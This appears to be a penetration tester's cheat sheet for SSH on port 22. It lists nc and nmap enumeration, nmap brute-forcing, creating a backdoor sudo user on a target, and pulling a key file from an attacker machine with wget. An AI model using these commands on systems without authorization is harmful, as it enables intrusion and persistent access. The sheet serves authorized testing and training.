# Port 22 SSH

## Enumeration

Application:
Version:
Protocol:
RSA-key-fingerprint:
Takes-password:
Username:Gobuster
Password:

- Banner Grab

 	  nc -nv <target_address> 22
 
- nmap script scan

	  nmap --script=ssh-auth-methods.nse,ssh-hostkey.nse,ssh-publickey-acceptance.nse,ssh-run.nse,ssh2-enum-algos.nse,sshv1.nse -p 22 <target_address>

If you have usernames/passwords test login with username@IPADDRESS

## bruteforce with nmap

	nmap --script=ssh-brute.nse -p 22 <target_address>
	
## Connect without executing .bash_rc and other profile scripts

	ssh -t <username>@<target_address> /bin/sh

## Create SSH User
    
- ### Create user
  
  (target machine)
  replace/modify sshd_config to allow password login
  
	  service sshd restart
	  
	  adduser <new_user>
	  passwd <new_user_password>
	  usermod -aG sudo <new_user>
	  
	  ssh <new_user>@<target_address>
	  cd ~
	  sudo echo test > testfile
	  ls testfile
 
- ### Upload user public key
  (1. attacker machine)
  
	  ssh-keygen
	  python -m SimpleHTTPServer <unused_port>

  (2. target machine)

	  wget <attacker_address>:<unused port>/<key_file_path>


